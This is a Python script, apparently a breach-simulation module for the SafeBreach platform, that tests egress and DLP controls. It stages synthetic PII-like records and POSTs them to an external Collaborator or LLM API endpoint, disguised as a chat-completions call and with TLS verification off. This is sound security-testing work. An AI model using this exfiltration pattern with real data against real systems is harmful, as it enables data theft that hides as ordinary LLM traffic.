# attacker.py — custom breach method (Exfiltration)
# Simulates: staged data exfil to an external endpoint / LLM API (T1074 -> T1041/T1567.002)
# Dummy data only. Unauthenticated POST by design — a 401/403 still proves egress + data left the host.
#
# SafeBreach injects Breach Method Parameters as keyword args into main(**kwargs).
# Env vars are used as a fallback so the script also runs when executed locally.
#
# Parameters:
#   TARGET_FQDN  - destination host (Burp Collaborator subdomain, then real LLM FQDN)
#   TARGET_PATH  - API path. "/" for Collaborator ; /v1/chat/completions for OpenAI-shaped
#   PAYLOAD_KB   - dummy blob size in KB. Default 64.
#   USE_HTTPS    - "true"/"false". Default true.
#   VERIFY_TLS   - "true"/"false". Set false only if Zscaler SSL inspection breaks the cert chain.

import os
import ssl
import json
import tempfile
import urllib.request
import urllib.error


def _param(kwargs, name, default):
    # Prefer SafeBreach-injected kwarg; fall back to env var; then default.
    if name in kwargs and kwargs[name] not in (None, ""):
        return kwargs[name]
    return os.environ.get(name, default)


def make_dummy_blob(kb):
    # Fabricated PII/financial-SHAPED text so outbound DLP has a pattern to catch.
    # NOT real data. Synthetic, obviously-fake values.
    line = ("FAKE-RECORD name=John Doe ssn=000-00-0000 "
            "cc=4111111111111111 acct=DE00-0000-0000-0000 "
            "email=fake.user@example.invalid note=synthetic-test-data\n")
    reps = max(1, (kb * 1024) // len(line))
    return (line * reps).encode("utf-8")


def build_request_body(blob):
    # Shape it like a real completions call: data embedded in a prompt field.
    return json.dumps({
        "model": "gpt-4",
        "messages": [
            {"role": "system", "content": "You are a data triage assistant."},
            {"role": "user", "content": "Summarize the following records:\n"
                + blob.decode("utf-8", "replace")}
        ]
    }).encode("utf-8")


def main(**kwargs):
    target_fqdn = _param(kwargs, "TARGET_FQDN", "Collaborator Endpoint")
    target_path = _param(kwargs, "TARGET_PATH", "/")
    payload_kb  = int(_param(kwargs, "PAYLOAD_KB", "64"))
    use_https   = str(_param(kwargs, "USE_HTTPS", "true")).lower() == "true"
    verify_tls  = str(_param(kwargs, "VERIFY_TLS", "false")).lower() == "true"

    if not target_fqdn:
        print("EXFIL_ERROR reason=TARGET_FQDN_not_set")
        return 1

    scheme = "https" if use_https else "http"
    url = "{}://{}{}".format(scheme, target_fqdn, target_path)

    # Stage locally (T1074)
    fd, staged = tempfile.mkstemp(prefix="sb_stage_", suffix=".dat")
    try:
        blob = make_dummy_blob(payload_kb)
        with os.fdopen(fd, "wb") as f:
            f.write(blob)

        body = build_request_body(blob)
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type", "application/json")
        # No Authorization header on purpose. Egress is the signal, not a valid completion.

        ctx = None
        if use_https and not verify_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

        try:
            resp = urllib.request.urlopen(req, timeout=25, context=ctx)
            code = resp.getcode()
        except urllib.error.HTTPError as e:
            # 401/403/400 from the provider == data reached it. SUCCESSFUL exfil path.
            code = e.code
        except urllib.error.URLError as e:
            # Connection refused/blocked/timeout == egress control likely PREVENTED it.
            print("EXFIL_BLOCKED reason={}".format(e.reason))
            return 1

        print("EXFIL_REACHED url={} http_status={} bytes_sent={}".format(
            url, code, len(body)))
        return 0  # reached destination (data left the host)

    finally:
        # Cleanup staged file — no persistence.
        try:
            os.remove(staged)
        except OSError:
            pass


if __name__ == "__main__":
    import sys
    sys.exit(main())
